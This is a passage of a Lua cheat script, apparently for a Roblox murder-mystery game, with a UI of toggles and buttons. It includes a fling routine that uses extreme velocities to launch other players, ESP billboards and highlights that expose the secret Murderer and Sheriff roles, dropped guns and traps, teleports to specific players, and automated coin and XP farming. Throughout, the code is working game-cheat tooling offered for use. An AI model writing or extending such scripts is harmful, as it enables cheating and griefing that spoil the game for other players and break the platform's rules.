    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end

        if THumanoid and THumanoid.Sit then
            return
        end

        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        elseif THumanoid and TRootPart then
            workspace.CurrentCamera.CameraSubject = THumanoid
        end

        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
            return
        end

        local function FPos(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end

        local function SFBasePart(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0
            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle += 100
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                end
            until Time + TimeToWait < tick() or not FlingActive
        end

        workspace.FallenPartsDestroyHeight = 0/0

        local BV = Instance.new("BodyVelocity")
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(0, 0, 0)
        BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)

        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

        if TRootPart then
            SFBasePart(TRootPart)
        elseif THead then
            SFBasePart(THead)
        elseif Handle then
            SFBasePart(Handle)
        else
            return
        end

        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid

        if DConfiguration.Misc.Manipulation.Fling.Enabled and getgenv().OldPos then
            local currentPos = RootPart.Position
            local distanceMoved = (currentPos - getgenv().OldPos.p).Magnitude

            if distanceMoved < 100000 then
                repeat
                    RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
                    Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
                    Humanoid:ChangeState("GettingUp")
                    for _, part in pairs(Character:GetChildren()) do
                        if part:IsA("BasePart") then
                            part.Velocity, part.RotVelocity = Vector3.new(), Vector3.new()
                        end
                    end
                    task.wait()
                until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
            else
                warn("WARNING: Reset skipped (teleport too far)")
            end

            workspace.FallenPartsDestroyHeight = getgenv().FPDH
        end
    else
        return
    end
end
 
 function DFunctions.ApplyDualEffects(Character, Tool)
    if not Character or not Tool then return end
    if not Tool:FindFirstChild("Handle") then return end

    local LeftHand = Character:FindFirstChild("LeftHand")
    local LeftUpperArm = Character:FindFirstChild("LeftUpperArm")
    if not LeftHand or not LeftUpperArm then return end

    local LeftShoulder = LeftUpperArm:FindFirstChild("LeftShoulder")
    if not LeftShoulder then return end

    local HandleName = Tool.Name .. "_LeftHandle"
    local ExistingHandle = Character:FindFirstChild(HandleName)

    if not ExistingHandle then
        local LeftHandle = Tool.Handle:Clone()
        LeftHandle.Name = HandleName
        LeftHandle.Parent = Character
        LeftHandle.CanCollide = false
        LeftHandle.Massless = true

        for _, v in ipairs(LeftHandle:GetDescendants()) do
            if v:IsA("Script")
            or v:IsA("LocalScript")
            or v:IsA("ModuleScript")
            or v:IsA("RemoteEvent")
            or v:IsA("RemoteFunction")
            or v:IsA("Sound") then
                v:Destroy()
            end
        end

        local RightHand = Character:FindFirstChild("RightHand")
        local RightWeld = RightHand and RightHand:FindFirstChildWhichIsA("Weld")

        local Weld = Instance.new("Weld")
        Weld.Name = "LeftHandWeld"
        Weld.Part0 = LeftHand
        Weld.Part1 = LeftHandle

        if RightWeld then
            Weld.C0 = RightWeld.C0
            Weld.C1 = RightWeld.C1
        else
            Weld.C0 = CFrame.new()
            Weld.C1 = CFrame.new()
        end

        Weld.Parent = LeftHand
    end
end

function DFunctions.RemoveDualEffects(Character, ToolName)
    if not Character then return end

    local LeftHandle = Character:FindFirstChild(ToolName .. "_LeftHandle")
    if LeftHandle then
        for _, v in ipairs(LeftHandle:GetDescendants()) do
            if v:IsA("BasePart") then
                v.Transparency = 1
            end
        end
        
        LeftHandle:Remove()
    end
end

Tabs.Main:AddToggle("BillboardInnocent", {
    Title = "Billboard Innocent",
    Default = false,
    Callback = function(value)
        DConfiguration.ESP.Innocent = value

        while DConfiguration.ESP.Innocent and wait(0.2) do
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    local Char = player.Character
                    local LocalChar = LocalPlayer.Character
                    local Backpack = player:FindFirstChild("Backpack")
                    local RoleInfo = Roles.Players and Roles.Players[player.Name]
                    local isAlive = DFunctions.IsAlive(player, Roles.Players)

                    if Char and LocalChar and Char:FindFirstChild("Head") and LocalChar:FindFirstChild("HumanoidRootPart") then
                        local Head = Char.Head
                        local color = nil
                        
                        local hasGun = (Char:FindFirstChild("Gun") or (Backpack and Backpack:FindFirstChild("Gun")))
                        local hasKnife = (Char:FindFirstChild("Knife") or (Backpack and Backpack:FindFirstChild("Knife")))
                        
                        if hasGun or hasKnife then
                            continue
                        end

                        if not isAlive then
                            color = Color3.fromRGB(255,255,255)
                        elseif not RoleInfo or RoleInfo.Role == "Innocent" then
                            color = Color3.fromRGB(0,255,0)
                        end

                        if color then
                            local sheriff = Head:FindFirstChild("SheriffESP")
                            if sheriff then sheriff:Destroy() end

                            local murderer = Head:FindFirstChild("MurdererESP")
                            if murderer then murderer:Destroy() end

                            if not Head:FindFirstChild("InnocentESP") then
                                CreateBillboardESP("InnocentESP", Head, color, 14)
                            end

                            UpdateBillboardESP("InnocentESP", Head, player.Name, color, 14, LocalChar.HumanoidRootPart.Position)
                        end
                    end
                end
            end
        end

        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then
                local esp = player.Character.Head:FindFirstChild("InnocentESP")
                if esp then esp:Destroy() end
            end
        end
    end
})

Tabs.Main:AddToggle("BillboardSheriff", {
    Title = "Billboard Sheriff",
    Default = false,
    Callback = function(value)
        DConfiguration.ESP.Sheriff = value

        while DConfiguration.ESP.Sheriff and wait(0.2) do
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    local Char = player.Character
                    local LocalChar = LocalPlayer.Character
                    local Backpack = player:FindFirstChild("Backpack")
                    local RoleInfo = Roles.Players and Roles.Players[player.Name]
                    local isAlive = DFunctions.IsAlive(player, Roles.Players)

                    if Char and LocalChar and Char:FindFirstChild("Head") and LocalChar:FindFirstChild("HumanoidRootPart") then
                        local Head = Char.Head
                        local color = nil

                        local hasGun = (Char:FindFirstChild("Gun") or (Backpack and Backpack:FindFirstChild("Gun")))
                        local hasKnife = (Char:FindFirstChild("Knife") or (Backpack and Backpack:FindFirstChild("Knife")))

                        if RoleInfo then
                            local isAlive = DFunctions.IsAlive(player, Roles.Players)

                            if isAlive then
                                if RoleInfo.Role == "Sheriff" then
                                    color = Color3.fromRGB(0,0,255)
                                elseif RoleInfo.Role == "Hero" then
                                    color = Color3.fromRGB(255,255,0)
                                end
                            
                            elseif hasGun and not hasKnife then
                               color = Color3.fromRGB(0,0,255)
                            end
                        end
                        
                        if color then
                            local innocent = Head:FindFirstChild("InnocentESP")
                            if innocent then innocent:Destroy() end
                            local murderer = Head:FindFirstChild("MurdererESP")
                            if murderer then murderer:Destroy() end
                            if not Head:FindFirstChild("SheriffESP") then
                                CreateBillboardESP("SheriffESP", Head, color, 14)
                            end

                            UpdateBillboardESP("SheriffESP", Head, player.Name, color, 14, LocalChar.HumanoidRootPart.Position)
                        end
                    end
                end
            end
        end

        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then
                local esp = player.Character.Head:FindFirstChild("SheriffESP")
                if esp then esp:Destroy() end
            end
        end
    end
})

Tabs.Main:AddToggle("BillboardMurderer", {
    Title = "Billboard Murderer",
    Default = false,
    Callback = function(value)
        DConfiguration.ESP.Murderer = value

        while DConfiguration.ESP.Murderer and wait(0.2) do
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    local Char = player.Character
                    local LocalChar = LocalPlayer.Character
                    local Backpack = player:FindFirstChild("Backpack")
                    local RoleInfo = Roles.Players and Roles.Players[player.Name]
                    local isAlive = DFunctions.IsAlive(player, Roles.Players)

                    if Char and LocalChar and Char:FindFirstChild("Head") and LocalChar:FindFirstChild("HumanoidRootPart") then
                        local Head = Char.Head
                        local color = nil

                        local hasGun = (Char:FindFirstChild("Gun") or (Backpack and Backpack:FindFirstChild("Gun")))
                        local hasKnife = (Char:FindFirstChild("Knife") or (Backpack and Backpack:FindFirstChild("Knife")))

                        if hasKnife then
                            color = Color3.fromRGB(255,0,0)
                        elseif RoleInfo then
                            local isAlive = DFunctions.IsAlive(player, Roles.Players)

                            if isAlive then
                                if RoleInfo.Role == "Murderer" then
                                    color = Color3.fromRGB(255,0,0)
                                end
                            end
                        end

                        if color then
                            local innocent = Head:FindFirstChild("InnocentESP")
                            if innocent then innocent:Destroy() end

                            local sheriff = Head:FindFirstChild("SheriffESP")
                            if sheriff then sheriff:Destroy() end

                            if not Head:FindFirstChild("MurdererESP") then
                                CreateBillboardESP("MurdererESP", Head, color, 14)
                            end

                            UpdateBillboardESP("MurdererESP", Head, player.Name, color, 14, LocalChar.HumanoidRootPart.Position)
                        end
                    end
                end
            end
        end

        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then
                local esp = player.Character.Head:FindFirstChild("MurdererESP")
                if esp then esp:Destroy() end
            end
        end
    end
})

Tabs.Main:AddParagraph({
        Title = "Objects",
        Content = ""
    })
    
Tabs.Main:AddToggle("BillboardGunDrop", {
    Title = "Billboard Gun Drop",
    Default = false,
    Callback = function(value)
        DConfiguration.ESP.Objects.GunDrop = value

        while DConfiguration.ESP.Objects.GunDrop and wait(0.1) do
            local GunDrop = DFunctions.FindGunDrop()
            local char = LocalPlayer.Character

            if GunDrop and char and char:FindFirstChild("HumanoidRootPart") then
                if not GunDrop:FindFirstChild("GunESP") then
                    CreateBillboardESP("GunESP", GunDrop, Color3.fromRGB(255, 215, 0), 18)
                end

                UpdateBillboardESP("GunESP", GunDrop, "Gun Drop", Color3.fromRGB(255, 215, 0), 18, char.HumanoidRootPart.Position)
            end
        end

        local GunDrop = DFunctions.FindGunDrop()
        if GunDrop then
            DestroyBillboardESP("GunESP", GunDrop)
        end
    end
})

Tabs.Main:AddToggle("BillboardThrowingKnife", {
    Title = "Billboard Throwing Knife",
    Default = false,
    Callback = function(value)
        DConfiguration.ESP.Objects.ThrowingKnife = value

        if value then
            for _, v in ipairs(workspace:GetDescendants()) do
                if v.Name == "StuckKnife" and v:IsA("BasePart") then
                    CreateBillboardESP("ThrowESP", v, Color3.fromRGB(225, 0, 0), 18)
                    UpdateBillboardESP("ThrowESP", v, "Knife Throwing", Color3.fromRGB(225, 0, 0), 18)
                end
            end
        else
            for _, v in ipairs(workspace:GetDescendants()) do
                if v.Name == "ThrowingKnife" or (v.Name == "StuckKnife" and v:IsA("BasePart")) then
                    DestroyBillboardESP("ThrowESP", v)
                end
            end
        end
    end
})

Tabs.Main:AddToggle("BillboardTraps", {
    Title = "Billboard Traps",
    Default = false,
    Callback = function(value)
        DConfiguration.ESP.Objects.Traps = value

        if value then
            for _, v in ipairs(workspace:GetDescendants()) do
                if v.Name == "Trap" then
                    local part = v:FindFirstChild("TrapVisual") or v:WaitForChild("TrapVisual", 1) or v:FindFirstChild("Trigger") or v:WaitForChild("Trigger", 1)
                    CreateBillboardESP("TrapESP", part, Color3.fromRGB(225, 0, 0), 18)
                    UpdateBillboardESP("TrapESP", part, "Trap", Color3.fromRGB(225, 0, 0), 18)
                end
            end
        else
            for _, v in ipairs(workspace:GetDescendants()) do
                if v.Name == "Trap" then
                    DestroyBillboardESP("TrapESP", v)
                end
            end
        end
    end
})

Tabs.Main:AddToggle("BillboardCoins", {
    Title = "Billboard Coins",
    Default = false,
    Callback = function(value)
        DConfiguration.ESP.Objects.Coins = value

        while DConfiguration.ESP.Objects.Coins and wait(0.1) do
            local Map = DFunctions.GetMap()
            local ESPName = "CoinsESP"
            local char = LocalPlayer.Character

            if Map and Map:FindFirstChild("CoinContainer") and char and char:FindFirstChild("HumanoidRootPart") then
                local CoinContainer = Map:FindFirstChild("CoinContainer")
                for _, v in pairs(CoinContainer:GetChildren()) do
                    if v.Name == "Coin_Server" then
                        if not v:FindFirstChild(ESPName) then
                            CreateBillboardESP(ESPName, v, Color3.fromRGB(218, 165, 32), 10)
                        end
                        UpdateBillboardESP(ESPName, v, "Coins", Color3.fromRGB(218, 165, 32), 10, char.HumanoidRootPart.Position)
                    end
                end
            end
        end

        if not DConfiguration.ESP.Objects.Coins then
            local Map = DFunctions.GetMap()
            local ESPName = "CoinsESP"
            local CoinContainer = Map and Map:FindFirstChild("CoinContainer")
            if not CoinContainer then return end

            for _, v in pairs(CoinContainer:GetChildren()) do
                if v.Name == "Coin_Server" then
                    DestroyBillboardESP(ESPName, v)
                end
            end
        end
    end
})

Tabs.Main:AddSection("Highlight ESP")

Tabs.Main:AddToggle("HighlightInnocent", {
    Title = "Highlight Innocent",
    Default = false,
    Callback = function(value)
        DConfiguration.Highlight.Innocent = value

        while DConfiguration.Highlight.Innocent and wait(0.5) do
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    local Char = player.Character
                    local Backpack = player:FindFirstChild("Backpack")
                    local RoleInfo = Roles.Players and Roles.Players[player.Name]
                    local isAlive = DFunctions.IsAlive(player, Roles.Players)

                    if Char and Char:FindFirstChild("HumanoidRootPart") then
                        local color

                        local hasGun = (Char:FindFirstChild("Gun") or (Backpack and Backpack:FindFirstChild("Gun")))
                        local hasKnife = (Char:FindFirstChild("Knife") or (Backpack and Backpack:FindFirstChild("Knife")))
                        
                        if hasGun or hasKnife then
                            continue
                        end

                        if not isAlive then
                            color = Color3.fromRGB(255,255,255)
                        elseif not RoleInfo or RoleInfo.Role == "Innocent" then
                            color = Color3.fromRGB(0,255,0)
                        end

                        if color then
                            local sheriff = Char:FindFirstChild("SheriffHL")
                            if sheriff then sheriff:Destroy() end

                            local murderer = Char:FindFirstChild("MurdererHL")
                            if murderer then murderer:Destroy() end

                            if not Char:FindFirstChild("InnocentHL") then
                                CreateHighlightESP("InnocentHL", Char, color, color, DConfiguration.Highlight.OutlineOnly)
                            else
                                UpdateHighlightESP("InnocentHL", Char, color, color, DConfiguration.Highlight.OutlineOnly)
                            end
                        end
                    end
                end
            end
        end

        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local hl = player.Character:FindFirstChild("InnocentHL")
                if hl then hl:Destroy() end
            end
        end
    end
})

Tabs.Main:AddToggle("HighlightSheriff", {
    Title = "Highlight Sheriff",
    Default = false,
    Callback = function(value)
        DConfiguration.Highlight.Sheriff = value

        while DConfiguration.Highlight.Sheriff and wait(0.5) do
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    local Char = player.Character
                    local Backpack = player:FindFirstChild("Backpack")
                    local RoleInfo = Roles.Players and Roles.Players[player.Name]
                    local isAlive = DFunctions.IsAlive(player, Roles.Players)

                    if Char and Char:FindFirstChild("HumanoidRootPart") then
                        local color

                        local hasGun = (Char:FindFirstChild("Gun") or (Backpack and Backpack:FindFirstChild("Gun")))
                        local hasKnife = (Char:FindFirstChild("Knife") or (Backpack and Backpack:FindFirstChild("Knife")))

                        if RoleInfo then
                            local isAlive = DFunctions.IsAlive(player, Roles.Players)

                            if isAlive then
                                if RoleInfo.Role == "Sheriff" then
                                    color = Color3.fromRGB(0,0,255)
                                elseif RoleInfo.Role == "Hero" then
                                    color = Color3.fromRGB(255,255,0)
                                end
                            
                            elseif hasGun and not hasKnife then
                               color = Color3.fromRGB(0,0,255)
                            end
                        end

                        if color then
                            local innocent = Char:FindFirstChild("InnocentHL")
                            if innocent then innocent:Destroy() end

                            local murderer = Char:FindFirstChild("MurdererHL")
                            if murderer then murderer:Destroy() end

                            if not Char:FindFirstChild("SheriffHL") then
                                CreateHighlightESP("SheriffHL", Char, color, color, DConfiguration.Highlight.OutlineOnly)
                            else
                                UpdateHighlightESP("SheriffHL", Char, color, color, DConfiguration.Highlight.OutlineOnly)
                            end
                        end
                    end
                end
            end
        end

        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local hl = player.Character:FindFirstChild("SheriffHL")
                if hl then hl:Destroy() end
            end
        end
    end
})

Tabs.Main:AddToggle("HighlightMurderer", {
    Title = "Highlight Murderer",
    Default = false,
    Callback = function(value)
        DConfiguration.Highlight.Murderer = value

        while DConfiguration.Highlight.Murderer and wait(0.5) do
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    local Char = player.Character
                    local Backpack = player:FindFirstChild("Backpack")
                    local RoleInfo = Roles.Players and Roles.Players[player.Name]
                    local isAlive = DFunctions.IsAlive(player, Roles.Players)

                    if Char and Char:FindFirstChild("HumanoidRootPart") then
                        local color

                        local hasGun = (Char:FindFirstChild("Gun") or (Backpack and Backpack:FindFirstChild("Gun")))
                        local hasKnife = (Char:FindFirstChild("Knife") or (Backpack and Backpack:FindFirstChild("Knife")))

                        if hasKnife then
                            color = Color3.fromRGB(255,0,0)
                        elseif RoleInfo then
                            local isAlive = DFunctions.IsAlive(player, Roles.Players)

                            if isAlive then
                                if RoleInfo.Role == "Murderer" then
                                    color = Color3.fromRGB(255,0,0)
                                end
                            end
                        end

                        if color then
                            local innocent = Char:FindFirstChild("InnocentHL")
                            if innocent then innocent:Destroy() end

                            local sheriff = Char:FindFirstChild("SheriffHL")
                            if sheriff then sheriff:Destroy() end

                            if not Char:FindFirstChild("MurdererHL") then
                                CreateHighlightESP("MurdererHL", Char, color, color, DConfiguration.Highlight.OutlineOnly)
                            else
                                UpdateHighlightESP("MurdererHL", Char, color, color, DConfiguration.Highlight.OutlineOnly)
                            end
                        end
                    end
                end
            end
        end

        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local hl = player.Character:FindFirstChild("MurdererHL")
                if hl then hl:Destroy() end
            end
        end
    end
})

Tabs.Main:AddParagraph({
        Title = "Objects",
        Content = ""
    })
    
Tabs.Main:AddToggle("HighlightGunDrop", {
    Title = "Highlight Gun Drop",
    Default = false,
    Callback = function(value)
        DConfiguration.Highlight.Objects.GunDrop = value

        while DConfiguration.Highlight.Objects.GunDrop and wait(0.3) do
            local GunDrop = DFunctions.FindGunDrop()

            if GunDrop then
                if not GunDrop:FindFirstChild("GunHighlight") then
                    CreateHighlightESP("GunHighlight", GunDrop, Color3.fromRGB(255,215,0), Color3.fromRGB(255,215,0), DConfiguration.Highlight.OutlineOnly)
                end

                UpdateHighlightESP("GunHighlight", GunDrop, Color3.fromRGB(255,215,0), Color3.fromRGB(255,215,0), DConfiguration.Highlight.OutlineOnly)
            end
        end

        local GunDrop = DFunctions.FindGunDrop()
        if GunDrop then
            DestroyHighlightESP("GunHighlight", GunDrop)
        end
    end
})

Tabs.Main:AddToggle("HighlightThrowingKnife", {
    Title = "Highlight Throwing Knife",
    Default = false,
    Callback = function(value)
        DConfiguration.Highlight.Objects.ThrowingKnife = value

        if value then
            for _, v in ipairs(workspace:GetDescendants()) do
                if v.Name == "KnifeStickWeld" and v.Parent then
                    CreateHighlightESP("ThrowHighlight", v.Parent, Color3.fromRGB(255,0,0), Color3.fromRGB(255,0,0), DConfiguration.Highlight.OutlineOnly)
                end
            end
        else
            for _, v in ipairs(workspace:GetDescendants()) do
                if v.Name == "ThrowingKnife" or (v.Name == "StuckKnife" and v:IsA("BasePart")) then
                    DestroyHighlightESP("ThrowHighlight", v)
                end
            end
        end
    end
})

Tabs.Main:AddToggle("HighlightTraps", {
    Title = "Highlight Traps",
    Default = false,
    Callback = function(value)
        DConfiguration.Highlight.Objects.Traps = value

        if value then
            for _, v in ipairs(workspace:GetDescendants()) do
                if v.Name == "Trap" then
                    local part = v:FindFirstChild("TrapVisual") or v:WaitForChild("TrapVisual", 1) or v:FindFirstChild("Trigger") or v:WaitForChild("Trigger", 1)
                    CreateHighlightESP("TrapHighlight", v, Color3.fromRGB(255,0,0), Color3.fromRGB(255,0,0), DConfiguration.Highlight.OutlineOnly)
                    v.Transparency = 0
                end
            end
        else
            for _, v in ipairs(workspace:GetDescendants()) do
                if v.Name == "Trap" then
                    DestroyHighlightESP("TrapHighlight", v)
                end
            end
        end
    end
})

Tabs.Main:AddToggle("HighlightCoins", {
    Title = "Highlight Coins",
    Default = false,
    Callback = function(value)
        DConfiguration.Highlight.Objects.Coins = value

        while DConfiguration.Highlight.Objects.Coins and wait(1) do
            local Map = DFunctions.GetMap()

            if Map then
                local CoinContainer = Map:FindFirstChild("CoinContainer")
                if CoinContainer then
                    if not CoinContainer:FindFirstChild("CoinsHighlight") then
                        CreateHighlightESP("CoinsHighlight", CoinContainer, Color3.fromRGB(218,165,32), Color3.fromRGB(218,165,32), DConfiguration.Highlight.OutlineOnly)
                    end

                    UpdateHighlightESP("CoinsHighlight", CoinContainer, Color3.fromRGB(218,165,32), Color3.fromRGB(218,165,32), DConfiguration.Highlight.OutlineOnly)
                end
            end
        end

        local Map = DFunctions.GetMap()
        if Map then
            local CoinContainer = Map:FindFirstChild("CoinContainer")
            if CoinContainer then
                DestroyHighlightESP("CoinsHighlight", CoinContainer)
            end
        end
    end
})



Tabs.Main:AddParagraph({
        Title = " ",
        Content = ""
    })

Tabs.Main:AddToggle("OutlineOnly", {
    Title = "Outline Only",
    Default = false,
    Callback = function(value)
        DConfiguration.Highlight.OutlineOnly = value
    end
})

Tabs.Main:AddSection("Notifications")

Tabs.Main:AddToggle("IndicateRole", {
    Title = "Indicate Roles",
    Default = false,
    Callback = function(value)
        DConfiguration.Indicators.Roles.LocalPlayer = value

        while DConfiguration.Indicators.Roles.LocalPlayer and wait(1) do
            DFunctions.NotifyRoles()
        end
    end
})

Tabs.Main:AddToggle("NotifyPerks", {
    Title = "Notify Perks",
    Default = false,
    Callback = function(value)
        DConfiguration.Indicators.Roles.Perks = value
    end
})

Tabs.Main:AddToggle("NotifySheriff", {
    Title = "Notify Sheriff",
    Default = false,
    Callback = function(value)
        DConfiguration.Indicators.Roles.Sheriff = value
    end
})

Tabs.Main:AddToggle("NotifyMurderer", {
    Title = "Notify Murderer",
    Default = false,
    Callback = function(value)
        DConfiguration.Indicators.Roles.Murderer = value
    end
})

Tabs.Main:AddParagraph({
        Title = "Objects",
        Content = ""
    })
    
Tabs.Main:AddToggle("NotifyGunDrop", {
    Title = "Notify Gun Drop",
    Default = false,
    Callback = function(value)
        DConfiguration.Indicators.Object.GunDrop = value
    end
})

Workspace.DescendantAdded:Connect(function(object)
    if DConfiguration.Indicators.Object.GunDrop and object.Name == "GunDrop" and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and object:IsA("BasePart") then        
        local distance = (object.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude

        Fluent:Notify({
            Title = "Gun Drop Detected!",
            Content = "Distance: " .. math.floor(distance) .. "M",
            Duration = 10
        })
    end
end)

wait(Duration)

Tabs.Main:AddSection("Teleportations")

Tabs.Main:AddButton({
        Title = "Teleport to Sheriff",
        Description = "",
        Callback = function()
        PlayerTP = Players:FindFirstChild(tostring(Roles.Sheriff))
        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(PlayerTP.Character.HumanoidRootPart.Position) * CFrame.new(0, 0, 2)
        end
    })
    
Tabs.Main:AddButton({
        Title = "Teleport to Murderer",
        Description = "",
        Callback = function()
        PlayerTP = Players:FindFirstChild(tostring(Roles.Murderer))
        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(PlayerTP.Character.HumanoidRootPart.Position) * CFrame.new(0, 0, 2)
        end
    })
    
Tabs.Main:AddParagraph({
        Title = " ",
        Content = ""
    })

Tabs.Main:AddButton({
    Title = "Teleport to Lobby",
    Description = "",
    Callback = function()           
        local player = game.Players.LocalPlayer
        local char = player.Character
        
        if char and char:FindFirstChild("HumanoidRootPart") then
            char:PivotTo(CFrame.new(14.72, 505.19, -61.29))
        else
            warn("Character not found!")
        end
    end
})


Tabs.Main:AddButton({
        Title = "Teleport to Map",
        Description = "",
        Callback = function()
          for i,v in pairs (workspace:GetDescendants()) do
              if v.Name == "Spawn" then
                 LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position) * CFrame.new(0,2.5,0)
              elseif v.Name == "PlayerSpawn" then
                 LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position) * CFrame.new(0,2.5,0)
               end
               LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
            end        
        end
    })
     
Tabs.Main:AddButton({
        Title = "Teleport to Above Map",
        Description = "",
        Callback = function()
         for i,v in pairs (workspace:GetDescendants()) do
              if v.Name == "Spawn" then
                 LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position) * CFrame.new(0,200,0)
             elseif v.Name == "PlayerSpawn" then
                 LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position) * CFrame.new(0,200,0)
               end
               LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
            end
        end
    })

wait(Duration)

-- AutoFarm

Tabs.AutoFarm:AddSection("Farmings")

Tabs.AutoFarm:AddToggle("TweenFarm", {
    Title = "Auto Farm Coins (Tween)",
    Default = false,
    Callback = function(value)
        DConfiguration.AutoFarm.TweenCoins = value
   
        while DConfiguration.AutoFarm.TweenCoins and wait(0.2) do
            spawn(DFunctions.TweenAutoFarmCoins)
        end
        
        if not DConfiguration.AutoFarm.TweenCoins then
            DFunctions.StopFarming()
            wait(2)
            DFunctions.StopFarming()
        end
    end
})

Tabs.AutoFarm:AddToggle("TPFarm", {
    Title = "Auto Farm Coins (Teleport)",
    Default = false,
    Callback = function(value)
        DConfiguration.AutoFarm.TeleportCoins = value
  
        while DConfiguration.AutoFarm.TeleportCoins and wait(0.2) do
            spawn(DFunctions.TPAutoFarmCoins)
        end
        
        if not DConfiguration.AutoFarm.TeleportCoins then
            DFunctions.StopFarming()
            wait(2)
            DFunctions.StopFarming()
        end
    end
})

 Tabs.AutoFarm:AddInput("TweenSpeed", {
        Title = "Tween Speed",
        Default = DConfiguration.AutoFarm.TweenSpeed,
        Placeholder = "25 (Safe)",
        Numeric = false, -- Only allows numbers
        Finished = false, -- Only calls callback when you press enter
        Callback = function(Value)
            DConfiguration.AutoFarm.TweenSpeed = tonumber(Value) or 25
        end
    })

Tabs.AutoFarm:AddToggle("XPFarm", {
    Title = "Auto Farm XP",
    Default = false,
    Callback = function(value)
        DConfiguration.AutoFarm.AutoFarmXP = value
    end
})

Tabs.AutoFarm:AddToggle("AutoReset", {
    Title = "Auto Reset When Coins Bag Full",
    Default = false,
    Callback = function(value)
        DConfiguration.AutoFarm.AutoReset = value
    end
})

Tabs.AutoFarm:AddSection("Coins Modification")

Tabs.AutoFarm:AddToggle("CoinsAura", {
    Title = "Magnetic Coins",
    Default = false,
    Callback = function(value)
        DConfiguration.AutoFarm.CoinsAura = value
        
        while DConfiguration.AutoFarm.CoinsAura and wait(0.1) do
            spawn(DFunctions.CoinsAura)
        end
    end
})

 Tabs.AutoFarm:AddInput("CoinAuraRange", {
        Title = "Coin Aura Range",
        Default = DConfiguration.AutoFarm.CoinsAuraDistance,
        Placeholder = "5 (Safe)",
        Numeric = false, -- Only allows numbers
        Finished = false, -- Only calls callback when you press enter
        Callback = function(Value)
            DConfiguration.AutoFarm.CoinsAuraDistance = tonumber(Value) or 10
        end
